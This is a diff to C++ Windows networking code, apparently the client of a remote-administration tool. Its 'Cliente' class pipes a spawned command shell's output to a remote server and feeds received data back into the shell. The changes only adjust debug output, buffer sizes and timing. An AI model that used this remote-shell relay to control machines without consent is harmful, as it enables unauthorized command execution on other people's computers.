@@ -146,10 +146,14 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
     }
     
     if (isBlock) {
+#ifdef ___DEBUG_
+        std::cout << "[BLOCK-MODE] send" << strPaqueteFinal.size() << " bytes\n";
+#endif
         //Hacer el socket block
         unsigned long int iBlock = 0;
         if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
 #ifdef ___DEBUG_
+            std::cout << "No se pudo hacer block\n";
             error();
 #endif
         }
@@ -179,10 +183,12 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
 
     int iRecibido = 0;
     if (isBlock) {
+        std::cout << "[BLOCK-MODE] recv " << std::endl;
         //Hacer el socket block
         unsigned long int iBlock = 0;
         if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
 #ifdef ___DEBUG_
+            std::cout << "No se pudo hacer block\n";
             error();
 #endif
         }
@@ -341,8 +347,8 @@ void Cliente::SpawnShell(const std::string pstrComando) {
 }
 
 void Cliente::thLeerShell(HANDLE hPipe) {
-    int iLen = 0, iRet = 0;
-    char cBuffer[2046], cBuffer2[2046 * 2 + 30];
+    //int iLen = 0; , iRet = 0;
+    char cBuffer[256], cBuffer2[256 * 2 + 30];
     DWORD dBytesReaded = 0, dBufferC = 0, dBytesToWrite = 0;
     BYTE bPChar = 0;
     while (this->isShellRunning) {
@@ -361,15 +367,13 @@ void Cliente::thLeerShell(HANDLE hPipe) {
                 bPChar = cBuffer2[dBytesToWrite++] = cBuffer[dBufferC];
             }
             cBuffer2[dBytesToWrite] = '\0';
-            iLen = strlen(cBuffer2);
 
             //enviar buffer al server
             std::string strOut = "06\\";
             strOut += cBuffer2;
-#ifdef ___DEBUG_
-            std::cout << strOut << "\n";
-#endif
+
             int isent = this->cSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, false);
+            Sleep(100);
 #ifdef ___DEBUG_
             std::cout << isent << "\n";
 #endif
@@ -392,9 +396,9 @@ void Cliente::thLeerShell(HANDLE hPipe) {
 }
 
 void Cliente::thEscribirShell(HANDLE hPipe) {
-    int iRet = 0;
-    char cRecvBytes[4096], cBuffer[2048];
-    DWORD dBytesWrited = 0, dBufferC = 0;
+    //int iRet = 0;
+    char cRecvBytes[4096];
+    DWORD dBytesWrited = 0;
     while (this->isShellRunning) {
         int iRecibido = this->cRecv(this->sckSocket, cRecvBytes, sizeof(cRecvBytes), 0, false);
 
@@ -408,7 +412,7 @@ void Cliente::thEscribirShell(HANDLE hPipe) {
         //if (cRecvBytes[0] == '\n' || cRecvBytes[0] == '\r' || dBufferC > 2047) {
             if (!WriteFile(hPipe, cRecvBytes, iRecibido, &dBytesWrited, nullptr)) {
 #ifdef ___DEBUG_
-                std::cout << "Error writing to pipe\n";
+                std::cout << "Error writing to pipe\n-DATA: " << cRecvBytes << std::endl;
                 error();
 #endif
                 std::unique_lock<std::mutex> lock(this->mtx_shell);
@@ -417,7 +421,7 @@ void Cliente::thEscribirShell(HANDLE hPipe) {
                 break;
             }
 #ifdef ___DEBUG_
-            std::cout << "Writed " << dBytesWrited << " bytes\n";
+            //std::cout << "Writed " << dBytesWrited << " bytes\n";
 #endif
             //dBufferC = 0;
         //}
